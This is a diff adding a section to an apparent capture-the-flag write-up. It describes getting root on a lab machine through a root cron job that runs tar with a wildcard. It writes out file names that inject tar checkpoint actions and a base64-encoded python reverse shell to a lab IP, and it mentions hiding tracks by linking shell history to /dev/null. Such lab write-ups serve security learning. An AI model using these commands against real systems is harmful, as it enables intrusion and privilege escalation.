@@ -78,3 +78,40 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 
 To get it working with the exploit, I url-encoded the above using Burp, then I stuck it into the url cmd parameter while I had a netcat listener running. Boom! Into the system.
+
+## cronjobs and admin
+
+First I fixed up the shell with the standard python tty: `python -c "import pty; pty.spawn('/bin/bash')"`. Then I tried `sudo -l` but it required the www-data password. Next step was to browse about and see what I could see.
+
+In `/home/milesdyson` there were a few funny things, including `.bash_history` symlinked to `/dev/null` (a way of obliterating any tracks? Must remember that...). More interesting was a folder owned by root called 'backups'. In there were two files: a `backup.tgz` file, and a `backup.sh`. I smelled a cron job.
+
+Sure enough, `cat /etc/crontab` revealed that root called that backup script every minute. The contents of `backup.sh` was:
+
+```
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+```
+
+I couldn't append to the file, as I didn't have access to the folder. However, I *did* have access, write access, to `/var/www/html` as `www-data`.
+
+But what could I do? I can't change root's `PATH`, so can't make them run something other than cd or tar. The `tar cf` had to be the key though, and so I looked about online. 
+
+Sure enough, there is unexpected behaviour when using a wildcard with tar. Specifically, if files in the target directory are ALSO valid tar arguments, they get interpreted as such. I picked this up from this newsblog: https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
+
+Going to `/var/www/html`, I created three files:
+
+```
+touch ./--checkpoint=1
+touch ./--checkpoint-action=exec=sh\ shell.sh
+```
+
+and then finally:
+
+```
+echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTUxLjQ3Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn | base64 -d > shell.sh
+```
+
+This last takes a base 64 encoded python reverse shell one liner (as used before, above) and decodes it into a file.
+
+Setting up a nc reverse listener, within a minute I had the magic pop of a root shell! The final flag was `3f0372db24753accc7179a282cd6a949`
